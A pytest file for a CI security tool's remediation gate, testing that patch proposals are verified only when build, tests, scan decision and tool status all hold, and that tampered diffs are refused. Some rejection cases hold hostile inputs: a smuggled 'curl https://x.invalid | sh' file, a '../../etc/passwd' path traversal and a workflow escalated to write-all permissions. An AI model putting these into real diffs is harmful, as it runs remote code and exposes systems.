"""The verification gate, the remediation states and the `sentinel remediate` commands (SPEC §9)."""

import hashlib
import json
import shutil
from pathlib import Path
from typing import Any

import pytest
from jsonschema import Draft202012Validator
from typer.testing import CliRunner

from sentinelci.cli import app
from sentinelci.contracts.finding import Finding
from sentinelci.contracts.remediation import PatchProposal, VerificationResult
from sentinelci.normalize.ndjson import dumps_ndjson
from sentinelci.remediation.gate import check_proposal, diff_paths, verify_proposal
from sentinelci.remediation.proposal import RemediationError, build_proposal, proposal_id_of, unified_diff
from sentinelci.remediation.states import advance, after_verification

from .conftest import NOW, ROOT, SEED, SEED_PATH, iac_finding, seed_findings

PROPOSAL = PatchProposal.model_validate_json(
    (ROOT / "schemas" / "fixtures" / "patch-proposal" / "valid" / "dependency-bump.json").read_bytes()
)
TARGET = PROPOSAL.finding_ids[0]


def _finding(rule: str, severity: str) -> Finding:
    return iac_finding(rule, path="demo-shop/infra/k8s/web.yaml", severity=severity)


EXISTING = _finding("KSV-0125", "MEDIUM")


def _verify(proposal: PatchProposal = PROPOSAL, **changes: Any) -> VerificationResult:
    target = iac_finding("KSV-0017", severity="HIGH").model_copy(update={"id": TARGET})
    inputs: dict[str, Any] = {
        "before": {TARGET: target, EXISTING.id: EXISTING},
        "after": {EXISTING.id: EXISTING},
        "build_ok": True,
        "tests_ok": True,
        "verdict": "PASS",
        "verified_at": NOW,
    }
    inputs.update(changes)
    return verify_proposal(proposal, **inputs)


def test_a_patch_is_verified_only_when_every_condition_holds(result_validator: Draft202012Validator) -> None:
    result = _verify(pull_request=42)
    assert (result.outcome, result.target_resolved, result.new_findings) == ("VERIFIED", True, [])
    assert after_verification(result) == "VERIFIED"
    assert not list(result_validator.iter_errors(json.loads(result.model_dump_json(exclude_none=True))))


NEW_HIGH = _finding("KSV-0014", "HIGH")
NEW_MEDIUM = _finding("KSV-0012", "MEDIUM")
NEW_LOW = _finding("KSV-0011", "LOW")


@pytest.mark.parametrize(
    ("changes", "failed"),
    [
        ({"build_ok": False}, "build_ok"),
        ({"tests_ok": False}, "tests_ok"),
        ({"verdict": "BLOCK"}, "verdict"),
        ({"after": {TARGET: iac_finding("KSV-0017"), EXISTING.id: EXISTING}}, "target_resolved"),
        ({"after": {EXISTING.id: EXISTING, NEW_HIGH.id: NEW_HIGH}}, "new_findings"),
        ({"after": {EXISTING.id: EXISTING, NEW_MEDIUM.id: NEW_MEDIUM}}, "new_medium"),
    ],
    ids=["build", "tests", "block", "target-still-there", "new-high-finding", "new-medium-finding"],
)
def test_any_failed_condition_rejects_the_patch(
    changes: dict[str, Any], failed: str, result_validator: Draft202012Validator
) -> None:
    result = _verify(**changes)
    assert result.outcome == "REJECTED"
    if failed == "new_findings":
        assert result.new_findings == [NEW_HIGH.id]
    assert not list(result_validator.iter_errors(json.loads(result.model_dump_json(exclude_none=True))))


def test_only_new_findings_of_medium_or_higher_count() -> None:
    assert _verify(after={EXISTING.id: EXISTING, NEW_LOW.id: NEW_LOW}).outcome == "VERIFIED"
    assert _verify(verdict="WARN").outcome == "VERIFIED", "WARN does not block a fix"


def test_the_last_attempt_fails_instead_of_retrying() -> None:
    second, last = (PROPOSAL.model_copy(update={"attempt": n}) for n in (2, 3))
    assert _verify(second, tests_ok=False).outcome == "REJECTED"
    assert _verify(last, tests_ok=False).outcome == "FAILED"
    assert _verify(last).outcome == "VERIFIED"


def test_a_result_that_claims_verified_against_the_gate_is_refused() -> None:
    claimed = _verify(tests_ok=False).model_dump() | {"outcome": "VERIFIED"}
    with pytest.raises(ValueError, match="VERIFIED needs"):
        VerificationResult.model_validate(claimed)


def test_a_proposal_touches_only_flagged_files_and_changes_something() -> None:
    common = {"strategy": "deterministic:kubernetes", "finding_ids": [TARGET], "rationale": "r", "attempt": 1,
              "created_at": NOW}  # fmt: skip
    with pytest.raises(RemediationError, match=r"touches files no finding flags: other\.yaml"):
        build_proposal(changes={"a.yaml": ("x\n", "y\n"), "other.yaml": ("x\n", "y\n")},
                       flagged_paths={"a.yaml"}, **common)  # type: ignore[arg-type]  # fmt: skip
    with pytest.raises(RemediationError, match="changes nothing"):
        build_proposal(changes={"a.yaml": ("x\n", "x\n")}, flagged_paths={"a.yaml"}, **common)  # type: ignore[arg-type]


def test_the_states_follow_section_9_only() -> None:
    state = "PROPOSED"
    for target in ("PATCH_READY", "PR_OPEN", "VERIFYING", "REJECTED", "PATCH_READY"):
        state = advance(state, target, attempt=1)  # type: ignore[arg-type]
    assert state == "PATCH_READY"
    for current, target in (("PROPOSED", "VERIFIED"), ("VERIFIED", "PATCH_READY"), ("FAILED", "PROPOSED"),
                            ("PR_OPEN", "REJECTED"), ("PATCH_READY", "VERIFYING")):  # fmt: skip
        over = current in ("VERIFIED", "FAILED")  # a terminal state says so
        with pytest.raises(
            RemediationError, match=f"{current} is over" if over else f"from {current} to {target}"
        ):
            advance(current, target, attempt=1)  # type: ignore[arg-type]
    with pytest.raises(RemediationError, match="no retry left after attempt 3"):
        advance("REJECTED", "PATCH_READY", attempt=3)
    assert advance("REJECTED", "FAILED", attempt=3) == "FAILED"


# ---------------------------------------------------------------- CLI


def _write_findings(path: Path, findings: list[Finding]) -> Path:
    path.write_text(dumps_ndjson(findings), encoding="utf-8")
    return path


def _status(tmp_path: Path, *tools: str) -> Path:
    """A tool status (schemas/tool-status.v1.json) where every tool named is ok."""
    entry = {"version": "1.0.0", "binary_sha256": "1" * 64, "status": "ok"}
    document = {"schema_version": 1, "lock_sha256": "0" * 64, "tools": dict.fromkeys(tools, entry)}
    path = tmp_path / f"tool-status-{'-'.join(tools)}.json"
    path.write_text(json.dumps(document))
    return path


STATUS = ("gitleaks", "trivy")  # what the PR scan of the seed ran


def _ok(tmp_path: Path) -> list[str]:
    """`--tool-status` with the status `_decision` records by default."""
    return ["--tool-status", str(_status(tmp_path, *STATUS))]


def _decision(
    tmp_path: Path, verdict: str, after: Path | None = None, status: Path | None = None, **changes: Any
) -> Path:
    """A pr-context decision made on `after` (its findings digest) that saw `status` (default: STATUS ok)."""
    fixture = json.loads(
        (ROOT / "schemas/fixtures/decision/valid/pass-pr-v1.2-with-baseline-and-tool-status.json").read_text()
    )
    status = status or _status(tmp_path, *STATUS)
    fixture["inputs"]["tool_status_digest"] = "sha256:" + hashlib.sha256(status.read_bytes()).hexdigest()
    fixture["verdict"] = verdict
    if after is not None:
        fixture["inputs"]["findings_digest"] = "sha256:" + hashlib.sha256(after.read_bytes()).hexdigest()
    fixture["subject"].update(changes)
    if verdict != "PASS":
        violation = {
            "rule": "SC-009",
            "effect": verdict,
            "finding_ids": ["a" * 64],
            "message": "CI workflow issue",
        }
        fixture["violations"] = [violation]
    path = tmp_path / f"decision-{verdict}-{len(list(tmp_path.glob('decision-*')))}.json"
    path.write_text(json.dumps(fixture))
    return path


def test_cli_proposes_then_verifies_the_seed_fix(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    (repo / "demo-shop" / "infra" / "k8s").mkdir(parents=True)
    shutil.copy(SEED, repo / SEED_PATH)
    before = _write_findings(tmp_path / "before.ndjson", seed_findings())
    out = tmp_path / "proposal.json"
    runner = CliRunner()
    result = runner.invoke(
        app,
        ["remediate", "kubernetes", "--findings", str(before), "--repo-root", str(repo), "--out", str(out)],
    )
    assert result.exit_code == 0, result.output
    proposal = PatchProposal.model_validate_json(out.read_bytes())
    assert "14 finding(s) in 1 file(s)" in result.output
    # After the patch, only the findings the fixer leaves alone are reported.
    fixed = set(proposal.finding_ids)
    after = _write_findings(tmp_path / "after.ndjson", [f for f in seed_findings() if f.id not in fixed])

    def verify(decision: Path, *flags: str) -> tuple[int, str, Path]:
        dest = tmp_path / f"result-{decision.stem}.json"
        args = ["remediate", "verify", "--proposal", str(out), "--before", str(before),
                "--after", str(after), "--decision", str(decision), "--build-ok", "--tests-ok",
                *_ok(tmp_path), "--out", str(dest), *flags]  # fmt: skip
        run = runner.invoke(app, args)
        return run.exit_code, run.output, dest

    code, output, dest = verify(_decision(tmp_path, "WARN", after), "--pull-request", "7")
    assert code == 0 and output.startswith("VERIFIED (attempt 1)"), output
    assert json.loads(dest.read_text())["pull_request"] == 7
    code, output, dest = verify(_decision(tmp_path, "BLOCK", after))
    assert code == 1 and "REJECTED (attempt 1): the decision is BLOCK" in output
    assert json.loads(dest.read_text())["outcome"] == "REJECTED"

    # #41 review, blocking 1: the decision must be the patched scan's, in pr context, with the tool status.
    empty = _write_findings(tmp_path / "empty.ndjson", [])
    for decision, scan, reason in (
        (_decision(tmp_path, "PASS"), after, "not made on the patched findings"),
        (_decision(tmp_path, "PASS", after), empty, "not made on the patched findings"),
        (_decision(tmp_path, "PASS", after, context="release"), after, "pr-context decision"),
    ):
        args = ["remediate", "verify", "--proposal", str(out), "--before", str(before),
                "--after", str(scan), "--decision", str(decision), "--build-ok", "--tests-ok", *_ok(tmp_path),
                "--out", str(tmp_path / "r.json")]  # fmt: skip
        run = runner.invoke(app, args)
        assert run.exit_code == 3 and reason in run.output and not (tmp_path / "r.json").exists(), run.output

    # #41 review, blocking 2, through the CLI: a proposal that is not what its id says verifies nothing.
    tampered = tmp_path / "tampered.json"
    tampered.write_text(
        proposal.model_copy(update={"diff": proposal.diff.replace("true", "false")}).model_dump_json()
    )
    run = runner.invoke(app, ["remediate", "verify", "--proposal", str(tampered), "--before", str(before),
                              "--after", str(after), "--decision", str(_decision(tmp_path, "PASS", after)),
                              "--build-ok", "--tests-ok", *_ok(tmp_path),
                              "--out", str(tmp_path / "t.json")])  # fmt: skip
    assert run.exit_code == 3 and "id does not match" in run.output, run.output

    # #41 review, nit 3: --out is never an input (it would be deleted first).
    kept = after.read_bytes()
    run = runner.invoke(app, ["remediate", "verify", "--proposal", str(out), "--before", str(before),
                              "--after", str(after), "--decision", str(_decision(tmp_path, "PASS", after)),
                              "--build-ok", "--tests-ok", *_ok(tmp_path), "--out", str(after)])  # fmt: skip
    assert run.exit_code == 3 and "--out is one of the inputs" in run.output and after.read_bytes() == kept
    run = runner.invoke(app, ["remediate", "kubernetes", "--findings", str(before), "--repo-root", str(repo),
                              "--out", str(before)])  # fmt: skip
    assert run.exit_code == 3 and before.exists()

    # #41 review, nit 2: a new HIGH finding elsewhere is new.
    elsewhere = iac_finding("KSV-0014", path="demo-shop/infra/k8s/other.yaml", severity="HIGH")
    worse = _write_findings(
        tmp_path / "worse.ndjson", [*(f for f in seed_findings() if f.id not in fixed), elsewhere]
    )
    code, output, _ = verify(_decision(tmp_path, "PASS", worse), "--after", str(worse))
    assert code == 1 and "1 new finding(s)" in output, output


def test_cli_with_nothing_fixable_writes_no_proposal(tmp_path: Path) -> None:
    findings = _write_findings(tmp_path / "f.ndjson", [iac_finding("KSV-0023")])
    out = tmp_path / "proposal.json"
    out.write_text("stale")
    result = CliRunner().invoke(
        app, ["remediate", "kubernetes", "--findings", str(findings), "--out", str(out)]
    )
    assert result.exit_code == 0 and "nothing to propose" in result.output and not out.exists()


@pytest.mark.parametrize("broken", ["findings", "proposal", "decision"])
def test_cli_untrusted_inputs_verify_nothing(tmp_path: Path, broken: str) -> None:
    findings = _write_findings(tmp_path / "f.ndjson", [])
    proposal = tmp_path / "p.json"
    proposal.write_text(PROPOSAL.model_dump_json())
    decision = _decision(tmp_path, "PASS")
    {"findings": findings, "proposal": proposal, "decision": decision}[broken].write_text("{not json\n")
    out = tmp_path / "result.json"
    out.write_text("stale")
    args = ["remediate", "verify", "--proposal", str(proposal), "--before", str(findings),
            "--after", str(findings), "--decision", str(decision), "--build-ok", "--tests-ok", *_ok(tmp_path),
            "--out", str(out)]  # fmt: skip
    result = CliRunner().invoke(app, args)
    assert result.exit_code == 3 and "FAIL CLOSED" in result.output and not out.exists()


# ---------------------------------------------------------------- #41 review: what "gone" and "new" mean


def test_a_target_reported_under_a_new_fingerprint_is_still_there() -> None:
    """Blocking 3: a renamed container gives the same rule a new fingerprint in the same file."""
    moved = iac_finding("KSV-0017", severity="LOW").model_copy(update={"id": "e" * 64})
    result = _verify(after={EXISTING.id: EXISTING, moved.id: moved})
    assert result.outcome == "REJECTED" and not result.target_resolved and result.new_findings == []


def test_a_finding_of_the_same_rule_left_as_it_was_does_not_hold_the_target() -> None:
    """A base finding the proposal did not claim, unchanged, is not the target moving."""
    unclaimed = iac_finding("KSV-0017", severity="HIGH").model_copy(update={"id": "d" * 64})
    target = iac_finding("KSV-0017", severity="HIGH").model_copy(update={"id": TARGET})
    before = {TARGET: target, unclaimed.id: unclaimed, EXISTING.id: EXISTING}
    result = _verify(before=before, after={unclaimed.id: unclaimed, EXISTING.id: EXISTING})
    assert result.outcome == "VERIFIED" and result.target_resolved


def test_a_base_finding_that_got_worse_is_new() -> None:
    """Nit 5: the same fingerprint, LOW before and CRITICAL after, counts as a new MEDIUM+ finding."""
    low = EXISTING.model_copy(update={"severity": "LOW"})
    critical = EXISTING.model_copy(update={"severity": "CRITICAL"})
    target = iac_finding("KSV-0017", severity="HIGH").model_copy(update={"id": TARGET})
    result = _verify(before={TARGET: target, low.id: low}, after={critical.id: critical})
    assert result.outcome == "REJECTED" and result.new_findings == [EXISTING.id]


def _seed_proposal(tmp_path: Path) -> PatchProposal:
    from sentinelci.remediation.kubernetes import propose

    repo = tmp_path / "repo"
    (repo / SEED_PATH).parent.mkdir(parents=True)
    shutil.copy(SEED, repo / SEED_PATH)
    plan = propose(seed_findings(), repo, created_at=NOW)
    assert plan.proposal is not None
    return plan.proposal


def _rebuilt(proposal: PatchProposal, **changes: Any) -> PatchProposal:
    """The proposal with other content and the id that content gives: well formed, like a hostile one."""
    changed = proposal.model_copy(update=changes)
    identity = proposal_id_of(changed.strategy, changed.attempt, changed.finding_ids, changed.diff)
    return changed.model_copy(update={"proposal_id": identity})


WORKFLOW = ".github/workflows/ci.yml"


@pytest.mark.parametrize(
    ("change", "message"),
    [
        (lambda p: p.model_copy(update={"diff": p.diff.replace("true", "false")}), "id does not match"),
        (lambda p: _rebuilt(p, finding_ids=["f" * 64]), "claims findings the base scan does not have"),
        (lambda p: _rebuilt(p, diff=unified_diff(WORKFLOW, "permissions: {}\n", "permissions: write-all\n"),
                            files=[WORKFLOW]), "where none of its findings was found"),
        (lambda p: _rebuilt(p, diff=p.diff.replace(f"a/{SEED_PATH}", "a/../../etc/passwd")
                            .replace(f"b/{SEED_PATH}", "b/../../etc/passwd")), "outside the repository"),
        (lambda p: _rebuilt(p, diff="x"), "not a plain edit"),
        (lambda p: _rebuilt(p, diff=f"diff --git a/{SEED_PATH} b/{SEED_PATH}\ndeleted file mode 100644\n"
                            f"--- a/{SEED_PATH}\n+++ /dev/null\n@@ -1 +0,0 @@\n-x\n"), "more than edit"),
        (lambda p: _rebuilt(p, diff=f"diff --git a/{SEED_PATH} b/x.yaml\nrename from {SEED_PATH}\n"),
         "renames or copies"),
        (lambda p: _rebuilt(p, diff=p.diff + p.diff), "each of its files once"),
    ],
    ids=["id-mismatch", "unknown-finding", "unflagged-file", "dotdot", "garbage", "delete", "rename",
         "twice"],
)  # fmt: skip
def test_the_gate_refuses_a_proposal_it_could_never_verify_honestly(
    tmp_path: Path, change: Any, message: str
) -> None:
    """#41 review, blocking 2: each of these gave VERIFIED with the real after-scan."""
    proposal = _seed_proposal(tmp_path)
    before = {finding.id: finding for finding in seed_findings()}
    check_proposal(proposal, before)  # the real proposal passes
    with pytest.raises(RemediationError, match=message):
        check_proposal(change(proposal), before)


@pytest.mark.parametrize(
    "smuggled",
    [
        f"--- a/{WORKFLOW}\n+++ b/{WORKFLOW}\n@@ -1 +1 @@\n-permissions: {{}}\n+permissions: write-all\n",
        "--- /dev/null\n+++ b/evil.sh\n@@ -0,0 +1 @@\n+curl https://x.invalid | sh\n",
    ],
    ids=["edit-a-workflow", "create-a-file"],
)
def test_a_patch_after_the_last_hunk_is_refused(tmp_path: Path, smuggled: str) -> None:
    """git apply reads a traditional ---/+++ pair after a hunk as one more file to change."""
    proposal = _seed_proposal(tmp_path)
    before = {finding.id: finding for finding in seed_findings()}
    with pytest.raises(RemediationError, match="not a plain edit"):
        check_proposal(_rebuilt(proposal, diff=proposal.diff + smuggled), before)


def test_a_pr_decision_that_never_saw_the_tool_status_verifies_nothing(tmp_path: Path) -> None:
    proposal = _seed_proposal(tmp_path)
    path = tmp_path / "proposal.json"
    path.write_text(proposal.model_dump_json(exclude_none=True))
    before = _write_findings(tmp_path / "before.ndjson", seed_findings())
    left = [finding for finding in seed_findings() if finding.id not in proposal.finding_ids]
    after = _write_findings(tmp_path / "after.ndjson", left)
    decision = _decision(tmp_path, "PASS", after)
    record = json.loads(decision.read_text())
    del record["inputs"]["tool_status_digest"]
    decision.write_text(json.dumps(record))
    out = tmp_path / "r.json"
    args = ["remediate", "verify", "--proposal", str(path), "--before", str(before), "--after", str(after),
            "--decision", str(decision), "--build-ok", "--tests-ok", *_ok(tmp_path),
            "--out", str(out)]  # fmt: skip
    run = CliRunner().invoke(app, args)
    assert run.exit_code == 3 and "saw the tool status" in run.output and not out.exists(), run.output


# Each hunk is read to its line counts (review of #41).
HEADER = "diff --git a/{0} b/{0}\n--- a/{0}\n+++ b/{0}\n"


@pytest.mark.parametrize(
    ("diff", "message"),
    [
        (HEADER.format("k.yaml") + "@@ -1 +1 @@\n-a: 1\n-b: 2\n+a: 2\n", "more lines than its header says"),
        (HEADER.format("k.yaml") + "@@ -1 +1 @@\n-a: 1\n+a: 2\n+b: 3\n", "not a plain edit"),
        (HEADER.format("k.yaml") + "@@ -1,2 +1,2 @@\n-a: 1\n+a: 2\n", "ends inside a hunk"),
        (HEADER.format("k.yaml") + "@@ -1 +1 @@\n-a: 1\n+a: 2\n x: extra\n", "not a plain edit"),
        (HEADER.format("k.yaml") + "@@ -1 +1 @@\n-a: 1\n+a: 2\nGIT binary patch\n", "not a plain edit"),
        (HEADER.format("k.yaml"), "changes nothing in k.yaml"),
        ("diff --git a/k.yaml b/k.yaml\nold mode 100644\nnew mode 100755\n", "more than edit k.yaml"),
        ('diff --git "a/k\\ty.yaml" "b/k\\ty.yaml"\n', "not a plain edit"),
        ("diff --git a/x b/x b/y\n", "renames or copies"),
        ("@@ -1 +1 @@\n-a\n+b\n", "not a plain edit"),
    ],
    ids=["hunk-too-long", "line-after-hunk", "hunk-cut-short", "context-after-hunk", "binary-after-hunk",
         "no-hunk", "mode", "quoted-path", "ambiguous-header", "hunk-without-header"],
)  # fmt: skip
def test_a_diff_is_read_hunk_by_hunk(diff: str, message: str) -> None:
    with pytest.raises(RemediationError, match=message):
        diff_paths(diff)


def test_plain_edits_are_read_as_git_reads_them() -> None:
    edit = "@@ -1,3 +1,3 @@\n a: 1\n-b: 2\n+b: 3\n c: 4\n@@ -10 +10,2 @@\n-z: 0\n+z: 1\n+y: 2\n"
    no_newline = "@@ -1 +1 @@\n-last\n\\ No newline at end of file\n+last!\n\\ No newline at end of file\n"
    empty_context = "@@ -1,3 +1,3 @@\n a: 1\n\n-b: 2\n+b: 3\n"  # git takes the bare empty line as context
    form_feed = "@@ -1,2 +1,2 @@\n a\x0cb\n-c\n+d\n"  # only \n ends a line, as for git
    diff = (
        HEADER.format("k8s/my app.yaml")
        + edit
        + "diff --git a/Dockerfile b/Dockerfile\nindex 1111111..2222222 100644\n"
        + "--- a/Dockerfile\n+++ b/Dockerfile\n"
        + no_newline
        + HEADER.format("a.yaml")
        + empty_context
        + HEADER.format("b.txt")
        + form_feed
    )
    assert diff_paths(diff) == ["k8s/my app.yaml", "Dockerfile", "a.yaml", "b.txt"]


# #41 review, should fix 1: the scanner of every target must be in the recorded tool status, ok.


def _verify_args(tmp_path: Path, status: Path, decision_status: Path | None = None) -> list[str]:
    proposal = _seed_proposal(tmp_path)
    path = tmp_path / "proposal.json"
    path.write_text(proposal.model_dump_json(exclude_none=True))
    before = _write_findings(tmp_path / "before.ndjson", seed_findings())
    after = _write_findings(tmp_path / "after.ndjson", [])  # a scan that saw nothing at all
    decision = _decision(tmp_path, "PASS", after, status=decision_status or status)
    return ["remediate", "verify", "--proposal", str(path), "--before", str(before), "--after", str(after),
            "--decision", str(decision), "--build-ok", "--tests-ok", "--tool-status", str(status),
            "--out", str(tmp_path / "r.json")]  # fmt: skip


def test_an_empty_scan_by_a_scanner_not_shown_ok_verifies_nothing(tmp_path: Path) -> None:
    """The review's repro: a pr decision whose tool status lists gitleaks only, and no Trivy finding."""
    run = CliRunner().invoke(app, _verify_args(tmp_path, _status(tmp_path, "gitleaks")))
    assert run.exit_code == 3 and "does not show trivy ok" in run.output, run.output
    assert not (tmp_path / "r.json").exists()


def test_the_tool_status_must_be_the_one_the_decision_recorded(tmp_path: Path) -> None:
    recorded = _status(tmp_path, "gitleaks")
    run = CliRunner().invoke(
        app, _verify_args(tmp_path, _status(tmp_path, *STATUS), decision_status=recorded)
    )
    assert run.exit_code == 3 and "not the one the decision recorded" in run.output, run.output


def test_a_tool_status_that_is_not_a_tool_status_verifies_nothing(tmp_path: Path) -> None:
    broken = tmp_path / "tool-status-broken.json"
    broken.write_text('{"schema_version": 1, "lock_sha256": "0", "tools": {}}')
    run = CliRunner().invoke(app, _verify_args(tmp_path, broken))
    assert run.exit_code == 3 and "not a tool-status v1 document" in run.output, run.output


def test_with_the_scanners_ok_the_same_empty_scan_reaches_the_gate(tmp_path: Path) -> None:
    """Control: with Trivy ok, the empty patched scan reaches the gate (VERIFIED: every target is gone)."""
    run = CliRunner().invoke(app, _verify_args(tmp_path, _status(tmp_path, *STATUS)))
    assert run.exit_code == 0 and run.output.startswith("VERIFIED"), run.output
